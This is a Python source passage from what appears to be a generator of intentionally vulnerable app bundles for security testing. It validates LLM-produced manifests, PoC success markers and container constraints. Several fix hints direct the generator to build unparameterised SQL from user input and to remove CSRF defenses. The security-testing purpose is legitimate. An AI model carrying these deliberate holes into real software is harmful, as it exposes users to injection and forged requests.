        text = (raw or "").strip()
        if text.startswith("```"):
            segments = [segment.strip() for segment in text.split("```") if segment.strip()]
            if segments:
                candidate = segments[0]
                if candidate.lower().startswith("json"):
                    candidate = candidate[4:].strip()
                text = candidate
        try:
            patched = json.loads(text)
        except Exception:
            return False
        if not isinstance(patched, dict) or not patched:
            return False
        files = patched.get("files")
        if not isinstance(files, list) or not files:
            return False
        manifest.clear()
        manifest.update(patched)
        return True

    def _sync_requirements_with_deps(self, manifest: Dict[str, Any], dep_names: set[str]) -> Dict[str, Any]:
        files = manifest.get("files")
        if not isinstance(files, list):
            return manifest
        req_entry = None
        for entry in files:
            if not isinstance(entry, dict):
                continue
            path = str(entry.get("path") or "").strip().lower()
            if path == "requirements.txt":
                req_entry = entry
                break
        if req_entry is None:
            req_entry = {
                "path": "requirements.txt",
                "role": "helper",
                "description": "Auto-generated requirements from guard autofix",
                "content": "",
            }
            files.append(req_entry)
        existing = []
        content = str(req_entry.get("content") or "")
        if content:
            existing = [line.strip() for line in content.splitlines() if line.strip()]
        seen = {line.split("==")[0].strip().lower() for line in existing if line}
        for dep in sorted(dep_names):
            if dep in seen:
                continue
            existing.append(dep)
            seen.add(dep)
        req_entry["content"] = "\n".join(existing).strip() + ("\n" if existing else "")
        return manifest

    def _guard_manifest(
        self,
        manifest: Dict[str, Any],
        *,
        precomputed_llm: Dict[str, Any] | None = None,
        auto_patch: Dict[str, Any] | None = None,
    ) -> Tuple[List[str], Dict[str, Any]]:
        errors: List[str] = []
        dep_error_messages: List[str] = []
        auto_patch = auto_patch or {"enabled": False}

        files = manifest.get("files")
        if not isinstance(files, list) or not files:
            errors.append("files array missing")
            return errors, {"errors": ["files array missing"]}

        if len(files) > self.limits.max_files:
            errors.append(f"files exceeds limit ({len(files)}/{self.limits.max_files})")

        allowlist = tuple(self.limits.allowlist)
        for entry in files:
            if not isinstance(entry, dict):
                errors.append("file entry must be object")
                continue
            path = entry.get("path", "")
            content = entry.get("content", "")
            if not path or Path(path).is_absolute() or ".." in Path(path).parts:
                errors.append(f"invalid path: {path}")
                continue
            if allowlist and not self._path_in_allowlist(path, allowlist):
                errors.append(f"path '{path}' not in allowlist")
            byte_len = len(content.encode("utf-8"))
            if byte_len > self.limits.max_bytes_per_file:
                errors.append(f"{path} exceeds byte limit ({byte_len})")

        errors.extend(self._guard_executor_constraints(manifest))

        poc = manifest.get("poc", {})
        if not isinstance(poc, dict) or "cmd" not in poc or "success_signature" not in poc:
            errors.append("poc section incomplete")
        else:
            signature = str(poc.get("success_signature") or "")

            # --- success signature handling --------------------------------
            runtime: Dict[str, Any] = {}
            if isinstance(self._rulespec, RuleSpec) and isinstance(self._rulespec.runtime, dict):
                runtime = self._rulespec.runtime
            markers = runtime.get("success_text_markers") or []
            primary_marker = markers[0] if isinstance(markers, list) and markers else None

            if primary_marker:
                # Runtime marker: keep manifest and PoC code aligned.
                if primary_marker not in signature:
                    errors.append(f"poc.success_signature must include runtime marker '{primary_marker}'")
                if not self._poc_contains(manifest, primary_marker):
                    errors.append(f"PoC entry must contain runtime marker '{primary_marker}'")
            else:
                # Legacy behaviour: fall back to the legacy rule signature or
                # a generic marker when no runtime marker exists.
                rule_sig = (self._rule or {}).get("success_signature") if hasattr(self, "_rule") else None
                expected_signature = rule_sig or "Exploit SUCCESS"
                if expected_signature and expected_signature not in signature:
                    errors.append(f"success_signature must include '{expected_signature}'")
                if expected_signature and not self._poc_contains(manifest, expected_signature):
                    errors.append(f"PoC entry must contain success signature '{expected_signature}'")

            # --- flag token handling ---------------------------------------
            runtime_flag = runtime.get("flag_token")
            rule_flag = (self._rule or {}).get("flag_token") if hasattr(self, "_rule") else None
            expected_flag = runtime_flag or rule_flag

            # Prefer RuleSpec policy when available; otherwise fall back to
            # legacy strict_flag semantics.
            strict_flag = False
            if isinstance(self._rulespec, RuleSpec):
                strict_flag = bool(self._rulespec.require_flag) and str(
                    getattr(self._rulespec, "flag_required_mode", "") or ""
                ).lower() == "strict"
            else:
                strict_flag = bool((self._rule or {}).get("strict_flag")) if hasattr(self, "_rule") else False

            if strict_flag and expected_flag:
                if not self._manifest_contains_literal(manifest, expected_flag):
                    errors.append(f"flag token '{expected_flag}' missing from manifest")

        deps = manifest.get("deps")
        if deps is None or not isinstance(deps, list) or not all(isinstance(d, str) for d in deps):
            errors.append("deps must be an array of strings")

        pattern_tags = manifest.get("pattern_tags")
        if not isinstance(pattern_tags, list) or not pattern_tags:
            errors.append("pattern_tags required")

        semantic_report = evaluate_manifest_semantics(
            str((self._requirement or {}).get("vuln_id") or ""),
            manifest,
        )
        if semantic_report.get("supported") and not semantic_report.get("semantic_match"):
            errors.append(f"semantic mismatch: {semantic_error_summary(semantic_report)}")

        dynamic_guard: Dict[str, Any] = {"available": False}
        if isinstance(self._guard_engine, GuardEngine):
            guard_eval = self._guard_engine.evaluate_manifest(manifest)
            dynamic_guard = guard_eval.to_dict()
            if guard_eval.violations:
                errors.extend(guard_eval.violations)
            if (not self._guard_engine.available) and self._guard_engine.should_fail_when_missing_spec():
                errors.append("dynamic guard spec missing under failure_policy")

        declared = self._extract_declared_dependencies(manifest)
        required_deps = self._detect_required_dependencies(manifest)
        missing_static = sorted(required_deps - declared.combined)
        for dep in missing_static:
            msg = f"missing dependency '{dep}' required by manifest files"
            errors.append(msg)
            dep_error_messages.append(msg)

        missing_from_requirements: List[str] = []
        if declared.from_requirements:
            missing_from_requirements = sorted(declared.from_deps_field - declared.from_requirements)
            for dep in missing_from_requirements:
                msg = f"deps entry '{dep}' missing from requirements files"
                errors.append(msg)
                dep_error_messages.append(msg)

        installed_from_build = self._detect_build_installs(manifest, declared.requirements_by_path)
        missing_from_build: List[str] = []
        if installed_from_build:
            missing_from_build = sorted((required_deps - installed_from_build) - set(missing_static))
            for dep in missing_from_build:
                msg = f"dependency '{dep}' not installed by build commands"
                errors.append(msg)
                dep_error_messages.append(msg)

        node_required = self._detect_node_required(manifest)
        node_declared = self._extract_node_declared_sets(manifest)
        missing_node = sorted(node_required - node_declared)
        for dep in missing_node:
            msg = f"missing node dependency '{dep}' required by manifest files"
            errors.append(msg)
            dep_error_messages.append(msg)
        node_installs = self._detect_node_installs(manifest)
        missing_node_build = sorted((node_required - node_installs) - set(missing_node))
        for dep in missing_node_build:
            msg = f"node dependency '{dep}' not installed by build commands"
            errors.append(msg)
            dep_error_messages.append(msg)

        rule_patterns = (self._rule or {}).get("patterns") or []
        for pattern in rule_patterns:
            ptype = (pattern.get("type") or "").strip().lower()
            if ptype == "file_contains":
                path = pattern.get("path")
                needle = pattern.get("contains")
                resolved_path = self._resolve_rule_path(path, manifest)
                if resolved_path and needle and not self._file_contains(manifest, resolved_path, needle):
                    errors.append(f"rule violation: file {resolved_path} missing '{needle}'")
            elif ptype == "poc_contains":
                needle = pattern.get("contains")
                if needle and not self._poc_contains(manifest, needle):
                    errors.append(f"rule violation: poc missing '{needle}'")

        os_packages = detect_os_packages(manifest, self._read_text_content)
        os_packages = {manager: sorted(packages) for manager, packages in os_packages.items() if packages}

        llm_section = precomputed_llm or {"enabled": False}
        llm_stdlib_skips: List[str] = []
        if self._dep_guard_config.get("llm_assist") and precomputed_llm is None:
            llm_section = self._llm_infer_dependencies(manifest, required_deps, declared)
        if llm_section:
            patched = set(auto_patch.get("patched_canonicals") or [])
            llm_missing = sorted(
                set(llm_section.get("missing_high_conf", []))
                - declared.combined
                - set(missing_static)
                - patched
            )
            llm_section["missing_high_conf"] = sorted(set(llm_section.get("missing_high_conf", [])))
            for dep in llm_missing:
                if self._is_stdlib_module(dep):
                    llm_stdlib_skips.append(dep)
                    continue
                msg = f"llm inferred dependency '{dep}' missing from manifest declarations"
                errors.append(msg)
                dep_error_messages.append(msg)
            if llm_stdlib_skips:
                llm_section["skipped_stdlib"] = sorted({self._canonicalize_package_name(dep) for dep in llm_stdlib_skips})

        dep_guard = {
            "declared": sorted(declared.combined),
            "declared_from_deps": sorted(declared.from_deps_field),
            "declared_from_requirements": sorted(declared.from_requirements),
            "required_static": sorted(required_deps),
            "installed_from_build": sorted(installed_from_build),
            "missing_static": missing_static,
            "missing_from_requirements": missing_from_requirements,
            "missing_from_build": missing_from_build,
            "errors": dep_error_messages,
            "llm": llm_section,
            "auto_patch": auto_patch,
            "node": {
                "required": sorted(node_required),
                "declared": sorted(node_declared),
                "missing": missing_node,
                "installed": sorted(node_installs),
                "missing_install": missing_node_build,
            },
            "os_packages": os_packages,
            "semantics": semantic_report,
            "dynamic_guard": dynamic_guard,
        }

        return errors, dep_guard

    def _guard_executor_constraints(self, manifest: Dict[str, Any]) -> List[str]:
        """Guardrails for executor runtime constraints (read-only container, /tmp writable)."""

        errors: List[str] = []
        dockerfile_tmp_db_matches: List[str] = []
        dockerfile_entry: Dict[str, Any] | None = None
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            if str(entry.get("path") or "").strip() == "Dockerfile":
                dockerfile_entry = entry
                break
        if dockerfile_entry:
            dockerfile_text = self._read_text_content(dockerfile_entry)
            if dockerfile_text:
                errors.extend(self._lint_dockerfile(dockerfile_text))
                dockerfile_tmp_db_matches = self._dockerfile_tmp_db_artifacts(dockerfile_text)

        if self._manifest_python_contains(manifest, "before_first_request"):
            errors.append(
                "executor constraint violation: Flask compatibility issue: do not use before_first_request "
                "(removed in Flask 3). Initialize resources explicitly at startup (call init_db() before app.run) "
                "or use before_request with a one-time guard."
            )

        service_path = self._resolve_rule_path("{{service_entry}}", manifest) or "app.py"
        service_entry: Dict[str, Any] | None = None
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            path = str(entry.get("path") or "").strip()
            if not path:
                continue
            if path == service_path or path.endswith(service_path):
                service_entry = entry
                break
        if not service_entry:
            return errors

        service_text = self._read_text_content(service_entry)
        if not service_text:
            return errors

        lowered = service_text.lower()
        if self._contains_sqlite3_cli_runtime(service_text):
            errors.append(
                "executor constraint violation: service_main must not invoke sqlite3 CLI at runtime "
                "(container is --read-only); use Python sqlite3 module and initialize the DB at service startup "
                "(create tables/seed data under /tmp)"
            )

        sqlite_used = "import sqlite3" in lowered or "sqlite3.connect" in lowered
        sqlite_db_under_tmp = sqlite_used and self._sqlite_db_path_is_tmp_writable(service_text)
        has_sqlite_init = self._manifest_has_sqlite_init(manifest)
        if dockerfile_tmp_db_matches and not (sqlite_db_under_tmp and has_sqlite_init):
            errors.append(self._format_dockerfile_tmp_db_error(dockerfile_tmp_db_matches))
        if sqlite_db_under_tmp and not has_sqlite_init:
            errors.append(
                "executor constraint violation: SQLite DB is under /tmp but no runtime schema/init code detected "
                "(ex: executescript(schema.sql) / CREATE TABLE / db.create_all). "
                "Remember /tmp starts empty each run; initialize tables/seed data when the service starts."
            )
        if sqlite_used and self._contains_sql_write_operations(service_text):
            if not self._sqlite_db_path_is_tmp_writable(service_text):
                errors.append(
                    "executor constraint violation: SQLite writes detected but DB path is not under /tmp; "
                    "store runtime DB/state under /tmp (ex: APP_DB_PATH default '/tmp/app.db')"
                )

        return errors

    def _manifest_python_contains(self, manifest: Dict[str, Any], needle: str) -> bool:
        if not needle:
            return False
        needle = needle.lower()
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            path = str(entry.get("path") or "").strip().lower()
            if not path.endswith(".py"):
                continue
            text = self._read_text_content(entry)
            if isinstance(text, str) and needle in text.lower():
                return True
        return False

    @staticmethod
    def _lint_dockerfile(dockerfile_text: str) -> List[str]:
        if not dockerfile_text:
            return []
        valid = {
            "ADD",
            "ARG",
            "CMD",
            "COPY",
            "ENTRYPOINT",
            "ENV",
            "EXPOSE",
            "FROM",
            "HEALTHCHECK",
            "LABEL",
            "MAINTAINER",
            "ONBUILD",
            "RUN",
            "SHELL",
            "STOPSIGNAL",
            "USER",
            "VOLUME",
            "WORKDIR",
        }
        errors: List[str] = []
        continuation = False
        for lineno, line in enumerate(dockerfile_text.splitlines(), start=1):
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            if continuation:
                continuation = stripped.endswith("\\")
                continue
            token = stripped.split(None, 1)[0].upper()
            if token not in valid:
                errors.append(
                    f"Dockerfile syntax risk: unknown instruction '{token}' at line {lineno} "
                    "(likely a multi-line RUN block spilled code onto new Dockerfile lines)"
                )
            continuation = stripped.endswith("\\")
        return errors

    @staticmethod
    def _dockerfile_tmp_db_artifacts(dockerfile_text: str) -> List[str]:
        if not dockerfile_text:
            return []
        pattern = re.compile(r"/tmp/[^\s'\"\\]+?\.(?:db|sqlite|sqlite3)", re.IGNORECASE)
        offenders: List[str] = []
        continuation = False
        current_token: str | None = None
        for line in dockerfile_text.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            if continuation:
                token = current_token or ""
                continuation = stripped.endswith("\\")
            else:
                token = stripped.split(None, 1)[0].upper()
                current_token = token
                continuation = stripped.endswith("\\")
            if token not in {"RUN", "COPY", "ADD"}:
                continue
            offenders.extend(pattern.findall(stripped))

        return sorted(set(offenders))

    @staticmethod
    def _format_dockerfile_tmp_db_error(matches: Sequence[str]) -> str:
        sample = ", ".join(list(matches)[:3])
        more = f" (+{len(matches) - 3} more)" if len(matches) > 3 else ""
        return (
            "executor constraint violation: Dockerfile appears to create DB artifacts under /tmp "
            f"({sample}{more}). /tmp is mounted as tmpfs at runtime and starts empty, so build-time /tmp DBs "
            "will not exist. Store seed/schema under /app and create /tmp DB at service startup (or keep a read-only "
            "DB under /app when no writes are required)."
        )

    def _manifest_has_sqlite_init(self, manifest: Dict[str, Any]) -> bool:
        init_markers = [
            "executescript",
            "create table",
            "schema.sql",
            "seed_data.sql",
            "create_all(",
            "db.create_all(",
            "init_sqlite",
        ]
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            path = str(entry.get("path") or "").strip().lower()
            if not path.endswith(".py"):
                continue
            text = self._read_text_content(entry)
            if not text:
                continue
            lowered = text.lower()
            if any(marker in lowered for marker in init_markers):
                return True
        return False

    @staticmethod
    def _contains_sqlite3_cli_runtime(service_text: str) -> bool:
        if not service_text:
            return False
        patterns = [
            r"subprocess\.(?:run|call|check_call|check_output|Popen)\s*\(\s*\[\s*['\"]sqlite3['\"]",
            r"os\.system\s*\(\s*['\"][^'\"]*\bsqlite3\b",
        ]
        return any(re.search(pattern, service_text, flags=re.IGNORECASE) for pattern in patterns)

    @staticmethod
    def _contains_sql_write_operations(service_text: str) -> bool:
        if not service_text:
            return False
        write_ops = r"(?:insert|update|delete|replace|create|drop|alter)"
        patterns = [
            rf"execute(?:many)?\s*\(\s*['\"][^'\"]*\b{write_ops}\b",
            rf"executescript\s*\(\s*['\"][^'\"]*\b{write_ops}\b",
        ]
        return any(re.search(pattern, service_text, flags=re.IGNORECASE) for pattern in patterns)

    @staticmethod
    def _sqlite_db_path_is_tmp_writable(service_text: str) -> bool:
        if not service_text:
            return False
        # Accept explicit /tmp paths, :memory:, or env var defaults pointing to /tmp.
        patterns = [
            r"(?m)^\s*(?:DATABASE|DB_PATH|APP_DB_PATH)\s*=\s*['\"](?:/tmp/|:memory:)",
            r"os\.environ\.get\s*\(\s*['\"][^'\"]*DB[^'\"]*['\"]\s*,\s*['\"](?:/tmp/|:memory:)",
            r"sqlite3\.connect\s*\(\s*['\"](?:/tmp/|:memory:)",
        ]
        return any(re.search(pattern, service_text, flags=re.IGNORECASE) for pattern in patterns)

    def _materialize(self, manifest: Dict[str, Any]) -> List[str]:
        if self.workspace.exists():
            shutil.rmtree(self.workspace)
        ensure_dir(self.workspace)
        written: List[str] = []
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            rel_path = Path(entry.get("path", ""))
            if not rel_path or rel_path.is_absolute():
                continue
            destination = self.workspace / rel_path
            ensure_dir(destination.parent)
            content = entry.get("content", "")
            encoding = entry.get("encoding", "plain")
            if encoding == "base64":
                try:
                    decoded = base64.b64decode(content.encode("utf-8"))
                    destination.write_bytes(decoded)
                except Exception as exc:  # pragma: no cover - safety fallback
                    LOGGER.warning("Base64 decode failed for %s: %s", rel_path, exc)
                    destination.write_text(content, encoding="utf-8")
            else:
                destination.write_text(content, encoding="utf-8")
            written.append(str(rel_path))
        return written

    def _write_candidate_log(self, reports: List[CandidateReport]) -> None:
        candidates_path = self.metadata_dir / "generator_candidates.json"
        payload = {
            "mode": self.mode,
            "candidates": [report.to_summary() for report in reports],
        }
        candidates_path.write_text(json.dumps(payload, indent=2, ensure_ascii=False), encoding="utf-8")

    def _write_records(
        self,
        selected: CandidateReport,
        reports: List[CandidateReport],
        hints: str,
        rag_context: str,
        failure_context: str,
        *,
        requires_external_db: bool,
    ) -> None:
        manifest_path = self.metadata_dir / "generator_manifest.json"
        generation_origin = "llm_manifest"
        if selected.fallback_used:
            generation_origin = "deterministic_fallback"
        elif selected.family_override_applied:
            generation_origin = "family_override"
        manifest_payload = {
            "sid": self.sid,
            "mode": self.mode,
            "limits": self.limits.to_dict(),
            # Absolute workspace root on disk for this synthesis run.
            # This allows downstream evaluators to locate the materialized
            # files without relying on hard-coded workspace/<sid>/app patterns.
            "workspace_root": str(self.workspace),
            "selected_candidate": selected.to_summary(),
            "manifest": selected.manifest,
            "failure_context": failure_context,
            "hints_digest": hashlib.sha256(hints.encode("utf-8")).hexdigest() if hints else "",
            "rag_snapshot_digest": hashlib.sha256(rag_context.encode("utf-8")).hexdigest()
            if rag_context
            else "",
            "user_deps": self._user_deps,
            "requires_external_db": requires_external_db,
            "guard_spec_available": bool(self._guard_spec_payload),
            "guard_policy": self._guard_engine.policy_snapshot if isinstance(self._guard_engine, GuardEngine) else {},
            "generation_origin": generation_origin,
            "fallback_used": selected.fallback_used,
            "fallback_class": selected.fallback_class or None,
            "family_override_applied": selected.family_override_applied,
            "llm_stub_used": selected.llm_stub_used,
            "llm_failure_class": selected.llm_failure_class,
            "llm_failure_message": selected.llm_failure_message,
            "provenance": {
                "generation_origin": generation_origin,
                "fallback_used": selected.fallback_used,
                "fallback_class": selected.fallback_class or None,
                "family_override_applied": selected.family_override_applied,
                "llm_stub_used": selected.llm_stub_used,
            },
        }
        manifest_path.write_text(json.dumps(manifest_payload, indent=2, ensure_ascii=False), encoding="utf-8")
        self._write_candidate_log(reports)

    def _record_guard_failure(self, reports: List[CandidateReport]) -> None:
        failure_paths = self._failure_paths()
        for path in failure_paths:
            ensure_dir(path.parent)
        missing_static: set[str] = set()
        missing_from_requirements: set[str] = set()
        missing_from_build: set[str] = set()
        llm_high_conf: set[str] = set()
        guard_notes: List[str] = []
        guard_violations: List[str] = []
        auto_patched: set[str] = set()
        auto_patch_entries: List[Dict[str, Any]] = []
        autofix_trace: List[Dict[str, Any]] = []
        llm_stub_used = False
        fallback_used = False
        fallback_class = ""
        family_override_applied = False
        llm_failure_class = ""
        llm_failure_message = ""
        for report in reports:
            guard = report.guard_report or {}
            if report.violations:
                guard_notes.extend(report.violations)
                guard_violations.extend(report.violations)
            missing_static.update(guard.get("missing_static") or [])
            missing_from_requirements.update(guard.get("missing_from_requirements") or [])
            missing_from_build.update(guard.get("missing_from_build") or [])
            errors = guard.get("errors") or []
            guard_notes.extend(errors)
            llm_section = guard.get("llm") or {}
            llm_high_conf.update(llm_section.get("missing_high_conf") or [])
            auto_patch = guard.get("auto_patch") or {}
            auto_patch_entries.append(auto_patch)
            auto_patched.update(auto_patch.get("patched_canonicals") or [])
            trace_entries = guard.get("guard_autofix_trace") or []
            if isinstance(trace_entries, list):
                autofix_trace.extend(trace_entries)
            llm_stub_used = llm_stub_used or bool(report.llm_stub_used)
            fallback_used = fallback_used or bool(report.fallback_used)
            if not fallback_class and isinstance(report.fallback_class, str) and report.fallback_class.strip():
                fallback_class = report.fallback_class.strip()
            family_override_applied = family_override_applied or bool(report.family_override_applied)
            if not llm_failure_class and isinstance(report.llm_failure_class, str) and report.llm_failure_class.strip():
                llm_failure_class = report.llm_failure_class.strip()
            if not llm_failure_message and isinstance(report.llm_failure_message, str) and report.llm_failure_message.strip():
                llm_failure_message = report.llm_failure_message.strip()
        suggested = sorted(llm_high_conf or missing_static)
        if auto_patched:
            suggested = sorted(set(suggested) | auto_patched)
        noted_missing = set(self._extract_missing_dependency_names(guard_notes))
        missing_all = sorted(missing_static | missing_from_requirements | missing_from_build | llm_high_conf | noted_missing)
        if noted_missing:
            suggested = sorted(set(suggested) | noted_missing)
        timestamp = datetime.now(timezone.utc).isoformat()
        reason = "; ".join(sorted(set(guard_notes))) or "guard violations"
        unsupported_ops = self._extract_unsupported_ops(guard_notes)
        schema_errors = self._extract_schema_errors(guard_notes)
        schema_normalizations: List[str] = []
        guard_normalization = (
            self._guard_spec_payload.get("normalization")
            if isinstance(self._guard_spec_payload, dict)
            else {}
        )
        if isinstance(guard_normalization, dict):
            raw_schema_normalizations = guard_normalization.get("schema_mismatches")
            if isinstance(raw_schema_normalizations, list):
                schema_normalizations.extend(
                    item for item in raw_schema_normalizations if isinstance(item, str) and item.strip()
                )
        schema_normalizations = sorted(
            set(item.strip() for item in schema_normalizations if isinstance(item, str) and item.strip())
        )
        schema_errors = sorted(set(item.strip() for item in schema_errors if isinstance(item, str) and item.strip()))
        guard_error_code = self._guard_error_code(
            guard_notes,
            unsupported_ops=unsupported_ops,
            schema_errors=schema_errors,
        )
        guard_error_subcode = self._guard_error_subcode(guard_notes, guard_error_code)
        autofix_effective = any(
            bool(item.get("effective"))
            for item in autofix_trace
            if isinstance(item, dict)
        )
        fix_hint = "Resolve generator guard violations and re-run synthesis."
        lowered_reason = reason.lower()
        if guard_error_code == "guard_dsl_unsupported_op":
            fix_hint = (
                "GuardSpec DSL mismatch detected. Regenerate/normalize guard assertions using supported ops only "
                "(file_exists/role_exists/file_contains/file_not_contains/file_regex_contains/"
                "file_regex_not_contains/file_regex_any/dep_declared/any_dep_declared/pattern_tag_present/"
                "manifest_field_equals/manifest_field_contains)."
            )
        if guard_error_code == "guard_assertion_schema_error":
            fix_hint = (
                "Guard assertion schema mismatch detected. Normalize assertion parameters "
                "(dep/name/package, deps/names/packages, string/contains/needle, regex/pattern) and retry."
            )
        if "semantic mismatch: missing input-to-sql composition path for cwe-89" in lowered_reason:
            fix_hint = (
                "CWE-89 requires a clear input-to-SQL flow. Build SQL using user-controlled input "
                "(request.args/form/json) via string concat/interpolation and pass that query string to "
                "cursor.execute(query). Do not parameterize this path in the intentionally vulnerable bundle."
            )
        elif "semantic mismatch: missing state-changing endpoint" in lowered_reason:
            fix_hint = (
                "CWE-352 requires at least one state-changing endpoint (POST/PUT/DELETE/PATCH). "
                "Add a state-changing route (ex: POST /change_email) that mutates server-side state."
            )
        elif "semantic mismatch: csrf token validation detected" in lowered_reason:
            fix_hint = (
                "CWE-352 scenario must intentionally omit CSRF defenses. Remove CSRF token/origin checks "
                "from the vulnerable endpoint while keeping session/cookie-based authentication."
            )
        elif missing_all:
            fix_hint = "Add the missing dependencies to manifest.deps and requirements*.txt, then re-run synthesis."
        elif "dockerfile syntax risk" in lowered_reason or "unknown instruction" in lowered_reason:
            fix_hint = (
                "Dockerfile syntax issue detected. Ensure every Dockerfile line starts with a valid instruction "
                "(FROM/RUN/COPY/...) or is a continuation line ending with '\\'. Avoid multi-line `RUN python -c` "
                "blocks that spill Python code onto new Dockerfile lines."
            )
        elif "before_first_request" in lowered_reason:
            fix_hint = (
                "Flask 3 removed before_first_request. Do not use that decorator; run initialization explicitly "
                "at startup (call init_db() before app.run) or use before_request with a one-time guard."
            )
        elif "dockerfile appears to create db artifacts under /tmp" in lowered_reason:
            fix_hint = (
                "Do not build SQLite DB state under /tmp (it is tmpfs at runtime and starts empty). "
                "Keep schema.sql/seed_data.sql under /app and initialize the /tmp DB at service startup "
                "(executescript(schema.sql) / CREATE TABLE / db.create_all)."
            )
        elif "sqlite db is under /tmp but no runtime schema/init code detected" in lowered_reason:
            fix_hint = (
                "SQLite under /tmp requires runtime initialization because /tmp starts empty each run. "
                "Add init_db()/init_sqlite_db() at service startup to create tables (schema.sql -> executescript) "
                "and optional seed data."
            )
        elif "executor constraint violation" in lowered_reason or "read-only" in lowered_reason or "sqlite3" in lowered_reason:
            fix_hint = (
                "Executor runs containers with --read-only and only /tmp writable. "
                "Store runtime state under /tmp and avoid runtime OS binaries (ex: sqlite3 CLI) unless installed at build time."
            )

        guard_spec_digest = ""
        if isinstance(self._guard_spec_payload, dict) and self._guard_spec_payload:
            serialized = json.dumps(self._guard_spec_payload, sort_keys=True, ensure_ascii=False)
            guard_spec_digest = hashlib.sha256(serialized.encode("utf-8")).hexdigest()
        normalized_notes = self._normalize_failure_notes(guard_notes)
        semantic_missing_buckets = self._extract_semantic_missing_buckets(guard_notes)
        builtin_semantic_errors = self._extract_builtin_semantic_errors(guard_notes)
        failure_fingerprint = self._build_failure_fingerprint(
            guard_error_code=guard_error_code,
            guard_error_subcode=guard_error_subcode,
            normalized_notes=normalized_notes,
            guard_spec_digest=guard_spec_digest,
            unsupported_ops=unsupported_ops,
            schema_errors=schema_errors,
            missing_dependencies=missing_all,
            semantic_missing_buckets=semantic_missing_buckets,
            builtin_semantic_errors=builtin_semantic_errors,
            vuln_id=str((self._requirement or {}).get("vuln_id") or ""),
        )

        vuln_id = str((self._requirement or {}).get("vuln_id") or "").strip() or "UNKNOWN"
        slug = self._bundle_slug(vuln_id)
        hint_payload = self._build_failure_hint_payload(
            vuln_id=vuln_id,
            slug=slug,
            guard_error_code=guard_error_code,
            fix_hint=fix_hint,
            missing_dependencies=missing_all,
            unsupported_ops=unsupported_ops,
            schema_errors=schema_errors,
            schema_normalizations=schema_normalizations,
            notes=guard_notes,
        )
        entry = {
            "sid": self.sid,
            "vuln_id": vuln_id,
            "slug": slug,
            "stage": "GENERATOR",
            "timestamp": timestamp,
            "reason": reason,
            "fix_hint": fix_hint,
            "missing_dependencies": missing_all,
            "suggested_dependencies": suggested,
            "notes": guard_notes,
            "auto_patch": auto_patch_entries[-1] if auto_patch_entries else {},
            "guard_violations": guard_violations,
            "guard_error_code": guard_error_code,
            "guard_error_subcode": guard_error_subcode,
            "unsupported_ops": unsupported_ops,
            "schema_errors": schema_errors,
            "schema_normalizations": schema_normalizations,
            # Backward compatibility for older loop readers.
            "schema_mismatches": schema_errors,
            "failure_fingerprint": failure_fingerprint,
            "hint_payload": hint_payload,
            "autofix_effective": autofix_effective,
            "autofix_trace": autofix_trace,
            "llm_stub_used": llm_stub_used,
            "fallback_used": fallback_used,
            "fallback_class": fallback_class or None,
            "family_override_applied": family_override_applied,
            "llm_failure_class": llm_failure_class or None,
            "llm_failure_message": llm_failure_message or None,
        }
        for failure_path in failure_paths:
            with failure_path.open("a", encoding="utf-8") as handle:
                handle.write(json.dumps(entry, ensure_ascii=False) + "\n")

    def _failure_paths(self) -> List[Path]:
        bundle_path = self.metadata_dir / "generator_failures.jsonl"
        paths: List[Path] = [bundle_path]
        metadata_root = self._metadata_root()
        root_path = metadata_root / "generator_failures.jsonl"
        if root_path != bundle_path:
            paths.append(root_path)
        unique: List[Path] = []
        seen: set[Path] = set()
        for path in paths:
            if path in seen:
                continue
            seen.add(path)
            unique.append(path)
        return unique

    def _metadata_root(self) -> Path:
        if self.metadata_dir.parent.name == "bundles":
            return self.metadata_dir.parent.parent
        return self.metadata_dir

    def _bundle_slug(self, vuln_id: str) -> str:
        if self.metadata_dir.parent.name == "bundles":
            return self.metadata_dir.name
        token = re.sub(r"[^a-z0-9]+", "-", vuln_id.lower()).strip("-")
        return token or "vuln"

    @staticmethod
    def _normalize_failure_notes(notes: List[str]) -> List[str]:
        normalized: List[str] = []
        for note in notes:
            if not isinstance(note, str):
                continue
            compact = re.sub(r"\s+", " ", note.strip().lower())
            if compact:
                normalized.append(compact)
        return sorted(set(normalized))

    @staticmethod
    def _build_failure_fingerprint(
        *,
        guard_error_code: str,
        guard_error_subcode: str,
        normalized_notes: List[str],
        guard_spec_digest: str,
        unsupported_ops: List[str],
        schema_errors: List[str],
        missing_dependencies: List[str],
        semantic_missing_buckets: List[str],
        builtin_semantic_errors: List[str],
        vuln_id: str,
    ) -> str:
        normalized_code = str(guard_error_code or "").strip().lower()
        payload: Dict[str, Any] = {
            "guard_error_code": normalized_code,
            "guard_error_subcode": str(guard_error_subcode or "").strip().lower(),
        }
        if normalized_code == "guard_assertion_schema_error":
            payload.update(
                {
                    "schema_errors": sorted(set(schema_errors)),
                    "guard_spec_digest": guard_spec_digest,
                }
            )
        elif normalized_code == "guard_semantic_mismatch":
            payload.update(
                {
                    "semantic_missing_buckets": sorted(set(semantic_missing_buckets)),
                    "builtin_semantic_errors": sorted(set(builtin_semantic_errors)),
                    "vuln_id": str(vuln_id or "").strip().upper(),
                }
            )
        elif normalized_code == "guard_dsl_unsupported_op":
            payload.update(
                {
                    "unsupported_ops": sorted(set(unsupported_ops)),
                    "guard_spec_digest": guard_spec_digest,
                }
            )
        elif normalized_code == "guard_dependency_missing":
            payload.update(
                {
                    "missing_dependencies": sorted(set(missing_dependencies)),
                    "vuln_id": str(vuln_id or "").strip().upper(),
                }
            )
        else:
            payload.update(
                {
                    "notes": normalized_notes,
                    "guard_spec_digest": guard_spec_digest,
                }
            )
        encoded = json.dumps(payload, ensure_ascii=False, sort_keys=True)
        return hashlib.sha256(encoded.encode("utf-8")).hexdigest()

    def _build_failure_hint_payload(
        self,
        *,
        vuln_id: str,
        slug: str,
        guard_error_code: str,
        fix_hint: str,
        missing_dependencies: List[str],
        unsupported_ops: List[str],
        schema_errors: List[str],
        schema_normalizations: List[str],
        notes: List[str],
    ) -> Dict[str, Any]:
        must_fix: List[Dict[str, Any]] = []
        for mismatch in schema_errors:
            must_fix.append(
                {
                    "kind": "assertion_schema",
                    "target": "guard_spec.generator_assertions",
                    "expected": "canonical assertion parameters",
